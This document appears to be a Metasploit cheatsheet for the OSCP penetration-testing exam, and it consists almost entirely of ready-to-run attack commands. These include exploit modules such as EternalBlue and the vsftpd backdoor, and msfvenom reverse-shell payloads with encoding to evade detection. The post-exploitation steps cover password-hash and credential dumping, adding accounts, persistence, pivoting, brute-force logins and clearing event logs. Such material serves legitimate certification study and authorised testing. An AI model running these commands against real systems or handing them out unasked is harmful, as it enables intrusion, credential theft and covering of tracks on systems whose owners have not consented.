# Metasploit Cheatsheet

Essential Metasploit Framework commands and techniques for the OSCP exam.

## Basic Commands

```bash
# Start Metasploit
msfconsole

# Search for modules
search type:exploit platform:windows smb

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set options
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100

# Run the exploit
exploit

# Run in background
background

# List sessions
sessions -l

# Interact with session
sessions -i 1
```

## Common Exploits

### Windows
```bash
# MS17-010 (EternalBlue)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit

# MS08-067
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

### Linux
```bash
# Samba usermap_script
use exploit/multi/samba/usermap_script
set RHOST 192.168.1.1
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.1.100
exploit

# vsftpd 2.3.4 Backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.1
exploit
```

### Web Applications
```bash
# PHP include
use exploit/unix/webapp/php_include
set RHOST 192.168.1.1
set PATH /vulnerable.php
set PHPCODE '<?php system("id"); ?>'
exploit

# Joomla com_media
use exploit/multi/http/joomla_media_upload_exec
set RHOST 192.168.1.1
set LHOST 192.168.1.100
exploit
```

## Meterpreter

### File System
```bash
# Basic commands
pwd
cd /path
ls
cat file.txt
upload /local/file.txt /remote/
download /remote/file.txt /local/

# Search for files
search -f *.txt
search -f "*password*" -d /home
```

### System Commands
```bash
# System info
sysinfo

# Get UID
getuid

# Get system privileges
getsystem

# List processes
ps

# Migrate to process
migrate <PID>

# Run command
shell
```

### Privilege Escalation
```bash
# Local exploit suggester
run post/multi/recon/local_exploit_suggester

# Get hashes
hashdump
run post/windows/gather/smart_hashdump

# Mimikatz
load kiwi
creds_all
```

## Post-Exploitation

### Windows
```bash
# Enable RDP
run post/windows/manage/enable_rdp

# Add user
run post/windows/manage/add_user USER=P@ssw0rd

# Dump passwords
run post/windows/gather/credentials/credential_collector
```

### Linux
```bash
# Get system info
uname -a
cat /etc/passwd
cat /etc/shadow

# Find SUID files
find / -perm -4000 2>/dev/null
```

## Port Forwarding

```bash
# List port forwards
portfwd list

# Local port forward
portfwd add -l 3389 -p 3389 -r 192.168.1.2

# Dynamic port forwarding
route add 192.168.2.0 255.255.255.0 1
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050
run
```

## Payloads

### Generate Payloads
```bash
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# Web
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

# Encode payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe > encoded.exe
```

### Handlers
```bash
# Start a handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
```

## Useful Modules

### Scanners
```bash
# Port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.1-254
set PORTS 1-10000
run

# SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.1/24
run
```

### Password Attacks
```bash
# SMB login
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.1
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# SSH login
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.1
set USERPASS_FILE creds.txt
run
```

## Tips for OSCP

1. **Use background jobs**
   ```
   exploit -j
   sessions -l
   sessions -i 1
   ```

2. **Auto-Route**
   ```
   run post/multi/manage/autoroute SUBNET=192.168.2.0/24
   ```

3. **Persistence**
   ```
   run persistence -X -i 5 -p 443 -r 192.168.1.100
   ```

4. **Meterpreter to Shell**
   ```
   shell
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```

5. **Clean Up**
   ```
   clearev
   rm /path/to/uploaded/file
   ```

## Common Issues

- **Handler not working?**
  - Check firewall rules
  - Verify payload matches handler
  - Try different ports (443, 80, 53 often work)

- **Exploit failing?**
  - Check service version
  - Try different targets
  - Adjust payloads
  - Check for bad characters
